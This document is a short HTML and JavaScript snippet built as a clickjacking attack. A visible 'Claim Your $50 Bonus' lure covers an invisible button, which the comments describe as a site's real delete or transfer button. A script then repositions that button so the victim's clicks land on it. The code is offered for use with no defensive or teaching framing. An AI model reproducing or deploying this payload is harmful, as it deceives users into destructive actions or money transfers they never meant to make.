<div style="position:relative;z-index:9999;pointer-events:none;width:200px;height:50px;">
  <!-- The real button is hidden underneath -->
  <button id="real_danger_btn" style="position:absolute;top:0;left:0;width:200px;height:50px;opacity:0;cursor:pointer;pointer-events:auto;z-index:2;">
    <!-- This is the real delete/transfer button from the site, but we make it invisible and cover it -->
  </button>
  <!-- The fake attractive button sits on top but passes clicks through via pointer-events:none -->
  <div style="position:absolute;top:0;left:0;width:200px;height:50px;background:green;color:white;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold;z-index:1;pointer-events:none;">
    🎁 Claim Your $50 Bonus
  </div>
</div>
<script>
  // Actually target the real button by moving it over the fake one
  const realBtn = document.querySelector('#real_danger_btn'); // Replace with actual ID/selector
  if(realBtn) {
    realBtn.style.position = 'fixed';
    realBtn.style.top = '200px';
    realBtn.style.left = '100px';
    realBtn.style.width = '200px';
    realBtn.style.height = '50px';
    realBtn.style.opacity = '0';
    realBtn.style.zIndex = '99999';
    realBtn.style.cursor = 'pointer';
  }
</script>
